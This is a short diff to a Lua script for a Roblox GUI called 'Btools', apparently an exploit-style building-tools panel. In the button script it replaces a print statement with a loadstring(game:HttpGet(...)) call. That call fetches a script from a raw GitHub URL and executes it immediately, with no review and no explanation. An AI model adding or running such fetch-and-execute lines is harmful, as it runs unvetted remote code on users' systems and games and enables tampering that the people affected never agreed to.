@@ -538,7 +538,7 @@ UI["2c"]["MaxTextSize"] = 30
 -- // StarterGui.Btools.Frame.Frame.ButtonScript \\ --
 local function SCRIPT_1f()
 local script = UI["1f"]
-	print("HI")
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xxbaconxxww/xxbaconxxww/refs/heads/main/f3xscript"))()
 end
 task.spawn(SCRIPT_1f)
 
